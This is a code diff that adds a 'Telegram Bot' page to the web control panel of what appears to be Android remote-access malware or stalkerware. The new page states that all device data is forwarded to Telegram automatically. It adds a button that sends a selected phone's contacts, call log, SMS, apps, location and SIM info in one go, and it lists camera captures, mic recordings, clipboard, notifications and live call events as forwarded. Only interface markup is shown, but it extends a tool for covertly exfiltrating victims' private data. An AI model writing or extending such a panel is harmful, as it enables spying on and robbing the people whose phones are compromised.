@@ -99,6 +99,10 @@
 
         <div class="nav-section">
           <div class="nav-section-title">Tools</div>
+          <a class="nav-item" data-page="telegram" onclick="navigateTo('telegram')">
+            <span class="icon">✈️</span>
+            <span>Telegram Bot</span>
+          </a>
           <a class="nav-item" data-page="info" onclick="navigateTo('info')">
             <span class="icon">ℹ️</span>
             <span>Device Info</span>
@@ -841,6 +845,56 @@
         <div id="simInfoContent">
           <div class="card" style="text-align:center;padding:40px">
             <p style="color:var(--text-muted)">Select a device and click "Get SIM Info" to view SIM details</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Telegram Bot Page -->
+      <section class="page-section" id="page-telegram">
+        <div class="page-header">
+          <div>
+            <h2>Telegram Bot</h2>
+            <p class="subtitle">All device data is automatically forwarded to Telegram</p>
+          </div>
+        </div>
+
+        <div class="card" style="padding:20px;margin-bottom:20px">
+          <h3 style="margin-bottom:15px">✈️ Telegram Bot Status</h3>
+          <div style="display:flex;gap:15px;align-items:center;flex-wrap:wrap">
+            <div id="telegramStatus" style="padding:8px 16px;border-radius:8px;background:var(--success);color:white;font-weight:600">
+              ✅ Active - All data is being forwarded
+            </div>
+            <button class="btn btn-primary" onclick="toggleTelegram()" id="telegramToggleBtn">Disable</button>
+            <button class="btn btn-outline" onclick="testTelegram()">Send Test Message</button>
+          </div>
+        </div>
+
+        <div class="card" style="padding:20px;margin-bottom:20px">
+          <h3 style="margin-bottom:15px">🚀 Send All Data Now</h3>
+          <p style="color:var(--text-muted);margin-bottom:15px">Select a device and send all its data (contacts, call log, SMS, apps, location, SIM info) to Telegram instantly.</p>
+          <div style="display:flex;gap:10px;align-items:center">
+            <select class="select-device" id="telegramDeviceSelect">
+              <option value="">Select a device...</option>
+            </select>
+            <button class="btn btn-primary" onclick="sendAllToTelegram()">📤 Send All Data to Telegram</button>
+          </div>
+        </div>
+
+        <div class="card" style="padding:20px">
+          <h3 style="margin-bottom:15px">📋 What gets forwarded automatically</h3>
+          <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:12px">
+            <div style="padding:12px;background:var(--bg-dark);border-radius:8px">📱 Device Connect/Disconnect</div>
+            <div style="padding:12px;background:var(--bg-dark);border-radius:8px">👥 Contacts</div>
+            <div style="padding:12px;background:var(--bg-dark);border-radius:8px">📞 Call Log</div>
+            <div style="padding:12px;background:var(--bg-dark);border-radius:8px">💬 SMS Messages</div>
+            <div style="padding:12px;background:var(--bg-dark);border-radius:8px">🛰️ GPS Location</div>
+            <div style="padding:12px;background:var(--bg-dark);border-radius:8px">🔔 Notifications</div>
+            <div style="padding:12px;background:var(--bg-dark);border-radius:8px">📷 Camera Captures</div>
+            <div style="padding:12px;background:var(--bg-dark);border-radius:8px">🎙️ Mic Recordings</div>
+            <div style="padding:12px;background:var(--bg-dark);border-radius:8px">📡 SIM Info</div>
+            <div style="padding:12px;background:var(--bg-dark);border-radius:8px">💻 Installed Apps</div>
+            <div style="padding:12px;background:var(--bg-dark);border-radius:8px">📋 Clipboard</div>
+            <div style="padding:12px;background:var(--bg-dark);border-radius:8px">📞 Live Call Events</div>
           </div>
         </div>
       </section>
